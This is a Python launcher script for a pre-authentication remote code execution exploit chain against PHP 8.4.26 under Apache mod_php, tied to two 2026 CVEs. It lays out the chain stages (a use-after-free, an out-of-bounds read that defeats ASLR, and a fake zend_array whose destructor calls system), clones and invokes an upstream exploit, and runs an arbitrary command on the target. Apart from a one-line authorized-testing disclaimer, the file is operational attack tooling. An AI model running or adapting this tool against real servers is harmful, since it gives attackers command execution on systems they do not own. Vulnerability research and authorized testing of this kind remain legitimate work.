#!/usr/bin/env python3
"""
CVE-2026-109618 / CVE-2026-109619 — Chain B: ASLR Bypass + Pre-Auth RCE
Heap UAF → stale-id OOB read (Zend chunk + libphp leak) → fake zend_array
→ pDestructor = zif_system

Requires: git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git ./aslr-exp

Usage:
  python3 chain_b_aslr.py http://target[:port]
  python3 chain_b_aslr.py http://127.0.0.1:18110 --exp-dir ./aslr-exp --cmd 'id'
  python3 chain_b_aslr.py http://127.0.0.1:18110 --retries 5

Chain stages:
  A1  END-cleanup send_cookie OOM
  B1  Stale-id OOB read  →  Zend chunk base + libphp base (ASLR bypassed)
  A2  Cheap OOM  →  dangling PS(http_session_vars)
  B2  Fake zend_array  →  pDestructor = zif_system  →  RCE

For authorized security testing only.
"""
import argparse
import os
import socket
import subprocess
import sys
import tempfile
import time
from urllib.parse import urlparse

DEFAULT_EXP_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "aslr-exp")
W = 54


def ok(msg):   print(f"  \033[92m[+]\033[0m {msg}")
def err(msg):  print(f"  \033[91m[-]\033[0m {msg}")
def info(msg): print(f"  \033[94m[*]\033[0m {msg}")
def warn(msg): print(f"  \033[93m[!]\033[0m {msg}")
def sep():     print(f"  {'─' * W}")


def banner():
    print(f"  ╔{'═' * W}╗")
    for line in ["CVE-2026-109618 / CVE-2026-109619  —  Chain B",
                 "ASLR Bypass + RCE (display_errors=Off)",
                 "by katherinepierce"]:
        print(f"  ║   {line:<{W - 4}}║")
    print(f"  ╚{'═' * W}╝")


def check_target(host: str, port: int) -> bool:
    try:
        s = socket.create_connection((host, port), timeout=5)
        s.sendall(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        resp = s.recv(1024)
        s.close()
        return b"HTTP/" in resp
    except Exception:
        return False


def main():
    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
        print(__doc__)
        sys.exit(0)

    ap = argparse.ArgumentParser(add_help=False)
    ap.add_argument("target")
    ap.add_argument("--exp-dir", default=DEFAULT_EXP_DIR, type=os.path.abspath)
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--timeout", type=float, default=600.0)
    ap.add_argument("--restart", default="")
    args = ap.parse_args()

    raw = args.target.rstrip("/")
    if "://" not in raw:
        raw = "http://" + raw
    u    = urlparse(raw)
    host = u.hostname
    port = u.port or 80

    print()
    banner()
    print()
    print(f"  Target  : {raw}")
    print(f"  Command : {args.cmd}")
    sep()

    # ── Verify upstream is present ───────────────────────────────────
    exp_py   = os.path.join(args.exp_dir, "exploit.py")
    pure_dir = os.path.join(args.exp_dir, "pure")

    if not os.path.isfile(exp_py):
        err("Upstream exploit not found.")
        err(f"  Expected: {exp_py}")
        err("  Clone it with:")
        err(f"  git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git {args.exp_dir}")
        print()
        sys.exit(1)

    if not os.path.isdir(pure_dir):
        warn("pure/ helpers missing — clone may be incomplete")
    else:
        ok(f"Upstream ready: {args.exp_dir}")

    sep()

    # ── Connectivity ─────────────────────────────────────────────────
    info("Checking target reachability...")
    if not check_target(host, port):
        err(f"Target unreachable: {host}:{port}")
        print()
        sys.exit(1)
    ok(f"Target responding at {host}:{port}")
    sep()

    # ── Stage overview ───────────────────────────────────────────────
    print(f"  {'Stage':<6}  Description")
    print(f"  {'─'*6}  {'─'*44}")
    print(f"  {'A1':<6}  END-cleanup send_cookie OOM")
    print(f"  {'B1':<6}  Stale-id OOB read → chunk + libphp base")
    print(f"  {'A2':<6}  Cheap OOM → dangling PS(http_session_vars)")
    print(f"  {'B2':<6}  Fake zend_array → pDestructor = zif_system")
    sep()
    info(f"Starting (retries={args.retries}, timeout={int(args.timeout)}s)...")
    print()

    # ── Build command ────────────────────────────────────────────────
    outdir = tempfile.mkdtemp(prefix="p2s-chainb-")
    proof  = os.path.join(outdir, "proof.txt")

    cmd = [
        sys.executable, exp_py,
        "--port", str(port),
        "--cmd", args.cmd,
        "--proof", proof,
        "--retries", str(args.retries),
        "--timeout", str(args.timeout),
    ]
    if args.restart:
        cmd += ["--restart", args.restart]

    start = time.time()
    try:
        result = subprocess.run(cmd, cwd=args.exp_dir)
    except KeyboardInterrupt:
        print()
        sys.exit(0)

    elapsed = time.time() - start
    print()
    sep()

    if result.returncode == 0 or os.path.exists(proof):
        ok(f"Chain B complete in {elapsed:.1f}s")
        if os.path.exists(proof):
            try:
                content = open(proof).read().strip()
            except Exception:
                content = "(unreadable)"
            if content:
                print()
                print("  Output:")
                for line in content.splitlines():
                    print(f"    {line}")
        print()
        ok("ASLR bypass + RCE CONFIRMED")
    else:
        warn(f"Chain exited ({result.returncode}) after {elapsed:.1f}s")
        warn("Check target requirements: PHP 8.4.26, Apache prefork, mod_php")
    print()


if __name__ == "__main__":
    main()
